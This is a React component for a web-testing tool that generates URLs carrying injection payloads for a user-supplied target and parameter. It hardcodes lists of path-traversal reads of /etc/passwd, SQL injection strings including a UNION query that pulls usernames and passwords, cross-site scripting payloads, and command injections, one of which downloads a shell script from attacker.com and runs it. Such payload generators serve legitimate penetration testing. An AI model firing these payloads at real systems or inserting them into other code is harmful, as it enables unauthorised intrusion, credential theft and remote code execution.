import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Copy, Check } from "lucide-react";
import { toast } from "sonner";

export function UrlParameterInjection() {
  const [baseUrl, setBaseUrl] = useState("http://example.com/page.php");
  const [parameter, setParameter] = useState("id");
  const [copied, setCopied] = useState<string | null>(null);

  const payloads = {
    lfi: [
      "../../../etc/passwd",
      "....//....//....//etc/passwd",
      "..%2F..%2F..%2Fetc%2Fpasswd",
      "../../../../../../etc/passwd%00",
      "php://filter/convert.base64-encode/resource=index.php",
    ],
    sqli: [
      "1' OR '1'='1",
      "1' OR 1=1--",
      "1' UNION SELECT NULL,NULL,NULL--",
      "1' AND 1=2 UNION SELECT username,password FROM users--",
      "' OR 'x'='x",
    ],
    xss: [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert('XSS')>",
      "javascript:alert('XSS')",
      "\"><script>alert(String.fromCharCode(88,83,83))</script>",
    ],
    rce: [
      "; ls -la",
      "| cat /etc/passwd",
      "`whoami`",
      "$(cat /etc/passwd)",
      "; wget http://attacker.com/shell.sh -O /tmp/shell.sh; bash /tmp/shell.sh",
    ],
  };

  const generateUrl = (payload: string) => {
    try {
      const url = new URL(baseUrl);
      url.searchParams.set(parameter, payload);
      return url.toString();
    } catch {
      return `${baseUrl}?${parameter}=${encodeURIComponent(payload)}`;
    }
  };

  const copyToClipboard = async (text: string, id: string) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(id);
      setTimeout(() => setCopied(null), 2000);
      toast.success("Copied to clipboard!", {
        description: "URL with injection payload",
      });
    } catch (err) {
      console.error("Failed to copy:", err);
      toast.warning("Failed to copy to clipboard", {
        description: "Please try again or copy manually",
      });
    }
  };

  return (
    <Card className="w-full max-w-4xl">
      <CardHeader>
        <CardTitle>URL Parameter Injection</CardTitle>
        <CardDescription>
          Generate URLs with various injection payloads for testing
        </CardDescription>
      </CardHeader>
      <CardContent className="space-y-6">
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div className="space-y-2 md:col-span-2">
            <Label htmlFor="baseUrl">Base URL</Label>
            <Input
              id="baseUrl"
              placeholder="http://example.com/page.php"
              value={baseUrl}
              onChange={(e) => setBaseUrl(e.target.value)}
            />
          </div>
          <div className="space-y-2 md:col-span-2">
            <Label htmlFor="parameter">Parameter Name</Label>
            <Input
              id="parameter"
              placeholder="id"
              value={parameter}
              onChange={(e) => setParameter(e.target.value)}
            />
          </div>
        </div>

        <Tabs defaultValue="lfi" className="w-full">
          <TabsList className="grid w-full grid-cols-4">
            <TabsTrigger value="lfi">LFI</TabsTrigger>
            <TabsTrigger value="sqli">SQLi</TabsTrigger>
            <TabsTrigger value="xss">XSS</TabsTrigger>
            <TabsTrigger value="rce">RCE</TabsTrigger>
          </TabsList>

          {Object.entries(payloads).map(([key, payloadList]) => (
            <TabsContent key={key} value={key} className="space-y-3">
              {payloadList.map((payload, index) => {
                const fullUrl = generateUrl(payload);
                const id = `${key}-${index}`;
                return (
                  <div key={index} className="relative">
                    <div className="bg-muted p-3 rounded-lg pr-12">
                      <div className="text-xs text-muted-foreground mb-1 font-mono">
                        Payload: {payload}
                      </div>
                      <div className="text-sm font-mono whitespace-pre-wrap break-all">
                        {fullUrl}
                      </div>
                    </div>
                    <Button
                      size="icon-sm"
                      variant="ghost"
                      className="absolute top-2 right-2"
                      onClick={() => copyToClipboard(fullUrl, id)}
                    >
                      {copied === id ? (
                        <Check className="h-4 w-4 text-green-500" />
                      ) : (
                        <Copy className="h-4 w-4" />
                      )}
                    </Button>
                  </div>
                );
              })}
            </TabsContent>
          ))}
        </Tabs>
      </CardContent>
    </Card>
  );
}
